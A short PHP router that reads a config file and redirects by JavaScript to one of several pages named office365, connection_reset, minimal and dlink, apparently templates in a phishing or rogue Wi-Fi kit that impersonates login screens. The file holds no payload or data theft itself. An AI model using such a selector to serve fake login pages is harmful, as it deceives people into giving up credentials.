<?php 
$json = json_decode(file_get_contents("config.json"), true);
print_r(array_slice($json, 1));
switch ($json['page']) {
    case "1":
        echo '<script script type="text/javascript">';
		echo 'window.location.href ="pages/office365/index.html";'; 
		echo '</script>';
		break;
    case "2":
        echo '<script script type="text/javascript">';
		echo 'window.location.href ="pages/connection_reset/index.html";'; 
		echo '</script>';
		break;
    case "3":
        echo '<script script type="text/javascript">';
		echo 'window.location.href ="pages/minimal/index.html";'; 
		echo '</script>';
		break;
	case "4":
        echo '<script script type="text/javascript">';
		echo 'window.location.href ="pages/dlink/index.html";'; 
		echo '</script>';
		break;
    default:
        echo '<script script type="text/javascript">';
		echo 'window.location.href ="install/";'; 
		echo '</script>';
}
?>